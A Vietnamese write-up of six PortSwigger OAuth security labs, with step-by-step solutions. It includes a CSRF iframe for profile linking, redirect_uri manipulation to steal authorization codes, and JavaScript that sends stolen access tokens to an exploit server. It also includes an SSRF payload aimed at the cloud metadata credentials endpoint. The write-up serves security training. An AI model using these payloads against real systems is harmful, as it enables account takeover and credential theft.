# [Portswigger] OAuth 2.0 authentication vulnerabilities

***

## 1. Lab: Authentication bypass via OAuth implicit flow

* Content:
```
This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the client application makes it possible for an attacker to log in to other users' accounts without knowing their password.

To solve the lab, log in to Carlos's account. His email address is carlos@carlos-montoya.net.

You can log in with your own social media account using the following credentials: wiener:peter.
```
* Giao diện Web:

Trang web dạng tin tức đơn thuần, có phần **My Account** trỏ đến link đăng nhập

<img width="334" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/1da9e6ac-468f-4507-876d-986d2dfb9b2c">

* Exploit:

Bật BurpSuite và thực hiện quá trình login với thông tin được đề bài cung cấp `wiener:peter`.
Theo dõi flow trên Burp HTTP History, ta thấy các request xác thực OAuth như sau:

<img width="634" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/da08f540-46ab-4cde-a483-6af709a23e63">

<img width="636" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/6818c186-38e7-43d1-ae20-3831beeb5918">

<img width="635" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/4201ce5f-fede-47b9-b78b-b14cea717ff9">

OAuth Services gửi lại thông tin về user mà Client Application muốn lấy

<img width="629" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/0e6d0f69-c7fa-4dac-8bc0-47f785e7392c">

Sau khi nhận được thông tin, Client Application sẽ gửi gói tin POST đến `/authenticate`, dùng các thông tin nhận được từ OAuth Services (bao gồm cả thông tin Token)

<img width="638" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/24b6127f-44da-4f4f-8f94-15be056c336a">

=> Chuyển request này sang Repeater, thay thế email truyền lên thành `carlos@carlos-montoya.net`. Sau đó chuột phải vào phần Response => Chọn "Request In Browser" => "In Original Session"

<img width="633" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/5c52cb1d-bd03-4345-8df5-2319af0f1e81">

Copy request được Burp Generate ra dán vào trình duyệt, ta thấy đã log in được vào bằng user **Carlos** và LAB SOLVED!

<img width="605" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/5a8b88b5-74e0-4954-be66-01c08701e827">

***
## 2. Lab: Forced OAuth profile linking

* Content:
```
This lab gives you the option to attach a social media profile to your account so that you can log in via OAuth instead of using the normal username and password. Due to the insecure implementation of the OAuth flow by the client application, an attacker can manipulate this functionality to obtain access to other users' accounts.

To solve the lab, use a CSRF attack to attach your own social media profile to the admin user's account on the blog website, then access the admin panel and delete carlos.

The admin user will open anything you send from the exploit server and they always have an active session on the blog website.

You can log in to your own accounts using the following credentials:

Blog website account: wiener:peter
Social media profile: peter.wiener:hotdog
```
* Exploit:

Giao diện login cho chúng ta 2 options: (Login bằng account local hoặc social media account)

<img width="369" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/4d9e12df-f09a-4603-85b8-fb780702bacc">

- Khi thực hiện login bằng account local thì sau khi login thành công sẽ có thêm 1 tùy chọn là "Attach a social profile" => Tức là gắn account local hiện tại với một tài khoản social media. Burpsuite bắt được 2 requests bao gồm Request đến OAuth để xác minh Social Media Account và Request đến `/oauth-linking?code=k3pEgFyxRLJQBs9GGo30g8K4xlKpPd4dtDMjyBuB763` (Nội dung đoạn code kia là ngẫu nhiên, dự đoán đoạn code trên tương ứng với tài khoản local mà đang request attach)

<img width="461" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/62fbe2f0-71b5-4d36-bf86-8ed97efb8632">

- Khi thực hiện login bằng social media account thì Client Application sẽ thực hiện request đến OAuth Service Provider

<img width="460" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/d6251c61-8710-44b7-8bf9-7846faa74386">

Quan sát thấy nội dung Request OAuth không có parametter **state** (Biến này có vai trò như CSRF Token trong việc xác minh các request giữa Client Aplication và OAuth Services Provider) => Có thể bị hacker lợi dụng.

Thực hiện kịch bản tấn công bằng cách sau:
1. Call đến tính năng "Attach a social profile", bật chế độ Burp Intercept On, copy lại URL gọi đến `/oauth-linking?code=xxx` (bao gồm cả mã code) => Sau đó drop gói tin này.
2. Logout khỏi tài khoản hiện tại.
3. Chuẩn bị 1 form CSRF trên Exploit Server với nội dung như bên dưới rồi Deliver to Victim:
```<iframe src="https://YOUR-LAB-ID.web-security-academy.net/oauth-linking?code=STOLEN-CODE"></iframe>```
4. Đợi 1 thời gian và truy cập lại ứng dụng, chọn Login with Social Media Account.
5. Sau khi truy cập bằng Social Media thì thấy tài khoản Social của chúng ta đã được gắn với Account victim (Administrator). Thực hiện xóa Carlos => Lab Solved!

<img width="619" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/25aa6234-25b6-4ce4-ba37-ffaefcc3edce">

***
## 3. Lab: OAuth account hijacking via redirect_uri

* Content:
```
This lab uses an OAuth service to allow users to log in with their social media account. A misconfiguration by the OAuth provider makes it possible for an attacker to steal authorization codes associated with other users' accounts.

To solve the lab, steal an authorization code associated with the admin user, then use it to access their account and delete the user carlos.

The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.

You can log in with your own social media account using the following credentials: wiener:peter.
```
* Exploit:

Theo dõi hành vi thực hiện thao tác login hệ thống:
- Lần đăng nhập đầu tiên, hệ thống redirect ta đến trang đăng nhập bằng tài khoản Social Media
- Thực hiện logout, từ lần đăng nhập thứ 2 thì hệ thống tự động login chúng ta vào bằng tài khoản đã đăng nhập trước đó (Ko bắt nhập lại username/password nữa)

Ngoài ra theo dõi trên BurpSuite ta thấy:
- Kể từ lần đăng nhập thứ 2, ngay sau 1 request `/auth?client_id=...` sẽ là request đến `/oauth-callback?code=...`

<img width="394" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/9fd4251f-9014-4f85-807d-c7cef8f53eea">

- Khi thực hiện request đến `/auth?client_id=...` thì giá trị của tham số `redirect_uri` sẽ là địa chỉ link chuyển hướng trình duyệt của người dùng đến ở request sau đó.

<img width="463" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/84d85187-63c1-4d01-b36a-6135afe191ec">

- Request này không chịu bất kỳ một sự kiểm soát/kiểm tra nào, thực hiện gửi một vài Craft Request qua Repeater BurpSuite thì thấy đều thực hiện chuyển hướng người dùng sang link chỉ định trong `redirect_uri` kèm theo giá trị `code`.

<img width="493" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/5062ad0d-6ba7-4b95-9d3d-62e68944ed43">

- Như vậy đặt giả thuyết là nếu ta truyền giá trị `redirect_uri` là một địa chỉ mà hacker kiểm soát thì hacker sẽ nhận được giá trị code này. Vậy nếu người dùng admin truy cập vào link `/auth?client_id=...` với `redirect_uri` là địa chỉ của hacker kiểm soát thì `code` của Admin sẽ bị Hacker chiếm được.

- Lab cho ta một Exploit Server để deliver link độc hại đến victim => Ta thực hiện gửi 1 link /exploit đến victim có nội dung như sau:

`<iframe src="https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>`

- Deliver to victim => Check log access trên Exploit server ta thấy đã nhận được giá trị code của victim:

<img width="634" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/995dca1e-d758-44ac-aeee-2341d9151ec5">

- Dùng code trên truy cập vào link `/oauth-callback?code=...` trên trình duyệt, xác nhận đã login được vào hệ thống bằng user Admin.
- Thực hiện xóa user Carlos => LAB Solved!
<img width="606" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/651a0dc9-751a-4a4e-b98a-1af2a37220d9">

***
## 4. Lab: Stealing OAuth access tokens via an open redirect
* Content:
```
This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the OAuth service makes it possible for an attacker to leak access tokens to arbitrary pages on the client application.

To solve the lab, identify an open redirect on the blog website and use this to steal an access token for the admin user's account. Use the access token to obtain the admin's API key and submit the solution using the button provided in the lab banner.

Note
You cannot access the admin's API key by simply logging in to their account on the client application.

The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.

You can log in via your own social media account using the following credentials: wiener:peter.
```
* Exploit:

Bắt request trên BurpSuite và thực hiện thao tác các bước lần lượt:
- Login vào tài khoản => Lần đầu thấy cần nhập username/password
- Logout khỏi tài khoản
- Login vào tài khoản => Từ lần thứ 2 trở đi không cần nhập thông tin username/password

Quan sát request trên Burp:
- Ở lần login thứ 2 trở đi thì Request đến `/auth?client_id=...` sẽ redirect trình duyệt của chúng ta đến link trong parametter `redirect_uri` kèm theo value  token của user (user đã login lần 1 trước đó)

<img width="460" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/2891e680-48ef-4096-9c21-7155490f580f">

- Ở link `/me`, sử dụng Token vừa nhận được sẽ nhận được response chứa thông tin api key của user:

<img width="461" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/9c129f69-a6ab-4683-86cd-425092defdf9">

- Thử nghiệm thanh đổi giá trị của parametter `redirect_uri` trong request 1 ta xác nhận thấy nếu thay đổi hostname hoặc đường dẫn uri không bắt đầu bằng `oauth-callback` thì request sẽ bị chặn.

- Như vậy không thể truyền thẳng URL độc hại trực tiếp luồn vào biến `redirect_uri` mà cần phải đi tìm cách khác. => Tính năng chuyển sang bài post kế tiếp có thể lợi dụng để truyền vào URL, cụ thể như sau:

<img width="494" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/a3b96115-7e75-46fd-a095-37027745b20c">

- Kết hợp lại ta có thể craft được payload như sau để bypass cơ chế check của biến `redirect_uri`:
`GET /auth?client_id=ubkeow5ujb9t28n9t7qdz&redirect_uri=https://0a2000840427abf8802e9955008900a1.web-security-academy.net/oauth-callback/../post/next?path=https%3A%2F%2Fexploit-0a6200800401abb4805a987e01680095.exploit-server.net%2Fexploit&response_type=token&nonce=1721753949&scope=openid%20profile%20email`

=> Đã có cách để redirect trình duyệt của victim đến chỗ khác, ngoài ra request redirect này sẽ có chứa giá trị của token ở sau dấu `#`. Ví dụ: `https://0a2000840427abf8802e9955008900a1.web-security-academy.net/oauth-callback/../post/next?path=https%3A%2F%2Fexploit-0a6200800401abb4805a987e01680095.exploit-server.net%2Fexploit#access_token=ndwGfvuYsDzBhk1CzXjRNoF60DyPWU2tuJxmT1Hd_7J&amp;expires_in=3600&amp;token_type=Bearer&amp;scope=openid%20profile%20email`.

- Trên exploit server, dùng payload như sau:

```javascript
<script>
    if (!document.location.hash) {
        window.location = 'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'
    } else {
        window.location = '/?'+document.location.hash.substr(1)
    }
</script>
```

Giải thích: đoạn `window.location = '/?'+document.location.hash.substr(1)` thì `window.location` là giá trị URL hiện tại. `document.location.hash.substr(1)` sẽ là giá trị ở sau dấu `#` đầu tiên có trọng URL. Ví dụ: `http://example.com/#section1` sẽ trở thành `http://example.com/?section1`
=> Nếu ban đầu chưa có link URL chứa ký tự `#` thì sẽ redirect trình duyệt người dùng vào link `https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email`. Khi này victim sẽ lại được redirect về link `exploit` trên Exploit Server lần nữa, tuy nhiên sẽ kèm theo giá trị value token đằng sau ký tự `#`. Lúc này `window.location = '/?'+document.location.hash.substr(1)` sẽ thực hiện chuyển đổi `#` thành `?` => Chúng ta sẽ thu được giá trị token này trong access log của Exploit Server.

<img width="630" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/4b310bc0-25d6-4e64-92be-b3b044af1fa9">

- Với giá trị token thu được, gửi request vào link `/me`:

<img width="491" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/14bbc6d3-bf51-4a0f-9356-db1aad732d37">

- Submit api key thu được & Lab Resolved!

<img width="583" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/3cb15e1c-6119-4148-8f6d-318e54148f2c">

***

## 5. Lab: Stealing OAuth access tokens via a proxy page

* Content:
```
This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the OAuth service makes it possible for an attacker to leak access tokens to arbitrary pages on the client application.

To solve the lab, identify a secondary vulnerability in the client application and use this as a proxy to steal an access token for the admin user's account. Use the access token to obtain the admin's API key and submit the solution using the button provided in the lab banner.

The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.

You can log in via your own social media account using the following credentials: wiener:peter.
```
* Exploit:

Lab này tương tự như Lab #4, tuy nhiên không còn chức năng view next post để có thể lợi dụng chuyển hướng victim request đến page của attacker nữa.
Tuy nhiên bài này có 1 tính năng khác có thể bị lợi dụng là: khi thực hiện post comment lên thì ứng dụng gọi đến `/post/comment/comment-form` để lấy giá trị người dùng nhập vào sau đó mới chuyển lên cửa sổ cha (windows hoặc iframe khác) để thực hiện post comment thông qua đoạn code javascript bên dưới đây:
```javascript
       <script>
            parent.postMessage({type: 'onload', data: window.location.href}, '*')
            function submitForm(form, ev) {
                ev.preventDefault();
                const formData = new FormData(document.getElementById("comment-form"));
                const hashParams = new URLSearchParams(window.location.hash.substr(1));
                const o = {};
                formData.forEach((v, k) => o[k] = v);
                hashParams.forEach((v, k) => o[k] = v);
                parent.postMessage({type: 'oncomment', content: o}, '*');
                form.reset();
            }
        </script>
```

Do vậy thực hiện phương thức như cách trong Lab #4, ta sẽ chuẩn bị 1 link URL như sau: `GET /auth?client_id=q9id6iqgkkwkytx9jb4jr&redirect_uri=https://0aa700bf0431cf8980cebcf900af00bf.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=792677125&scope=openid%20profile%20email` để gửi cho victim click vào thông qua Exploit Server.
=> Trên Exploit Server nhúng 1 đoạn iframe để gửi đến victim:
```html
<iframe src='<HOST-LAB-DOMAIN>/auth?client_id=q9id6iqgkkwkytx9jb4jr&redirect_uri=https://0aa700bf0431cf8980cebcf900af00bf.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=792677125&scope=openid%20profile%20email'></iframe>
```
Thêm đoạn code sau bên dưới để trigger người dùng sau khi truy cập vào link trên sẽ lấy listen link redirect nhận được và lấy giá trị URI fetch lên / của exploit server luôn => Sau này hacker sẽ lấy thông tin này ra từ access log của Exploit Server.
```javascript
<script>
    window.addEventListener('message', function(e) {
        fetch("/" + encodeURIComponent(e.data.data))
    }, false)
</script>
```

Sau khi Store payload và gửi đến victim => Check access log sẽ thấy dữ liệu access_token:

<img width="552" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/86d2bcb6-8adc-495d-bd63-d99676d5dd9a">

Sử dụng token đó truy cập vào link `/me` (tương tự lab trước):

<img width="486" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/830ee4e1-9fc4-4390-8679-180bd467d12b">

Sau khi lấy đc thông tin apikey, tực hiện submit và LAB Solved!

<img width="594" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/23566d32-39a8-4ca4-bf0e-bd9899b72c37">

***
## 6. Lab: SSRF via OpenID dynamic client registration

* Content:
```
This lab allows client applications to dynamically register themselves with the OAuth service via a dedicated registration endpoint. Some client-specific data is used in an unsafe way by the OAuth service, which exposes a potential vector for SSRF.

To solve the lab, craft an SSRF attack to access http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/ and steal the secret access key for the OAuth provider's cloud environment.

You can log in to your own account using the following credentials: wiener:peter

Note
To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.
```
* Exploit:

- Thực hiện request đến `.well-known/openid-configuration` để truy cập vào thông tin cấu hình của openid => Xác định được link `registration` ở `/reg`

<img width="462" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/26588686-4144-4002-988b-2340a7ded748">

- Thực hiện gửi request POST đến `/reg`, truyền lên thông tin dạng JSON như sau:

```
{
    "redirect_uris" : [
        "http://abc.com/"
    ],
"logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
}
```
Ứng dụng sẽ trả về thông báo đăng ký thành công, kèm theo thông tin của "client_id"

<img width="493" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/f5bc37a1-eb78-4c15-b626-dec37f5ad0d0">

- Lý do truyền vào giá trị `logo_uri` là do khi bắt request trên Burp, ta quan sát được hành vi có một request đến link dạng `/client/<client-id>/logo` để yêu cầu OAuth Server request đến link logo của client:

<img width="459" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/09c2bbc8-e93e-45e9-acf7-cea4b6ab2608">

=> Ta lợi dung link chỗ `logo_uri` này để khai thác tấn công SSRF, lợi dụng OAuth Server gửi request đến `http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/` như đầu bài yêu cầu.

- Kích hoạt việc OAuth Server gửi request trên bằng cách call request đến link `/client/<client-id>/logo` với Client_id thu được ở bước đăng ký Client.

<img width="490" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/19fc8508-b3a6-4d51-a4be-d7d29be501fd">

=> Thu được SecretKeyID và LAB Solved!

